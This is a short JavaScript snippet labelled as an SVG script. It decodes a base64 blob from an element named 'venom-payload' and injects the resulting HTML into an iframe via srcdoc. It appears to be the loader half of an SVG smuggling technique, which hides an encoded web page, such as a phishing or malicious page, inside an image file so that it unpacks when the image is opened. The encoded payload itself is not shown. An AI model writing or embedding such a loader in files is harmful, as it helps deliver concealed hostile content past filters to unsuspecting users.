svg.script:
(function(){
var B64=document.getElementById("venom-payload").textContent.replace(/\s+/g,"");
var bin=atob(B64),len=bin.length,u8=new Uint8Array(len);
for(var i=0;i<len;i++)u8[i]=bin.charCodeAt(i);
var html=new TextDecoder("utf-8").decode(u8);
document.getElementById("venom-frame").srcdoc=html;
})();
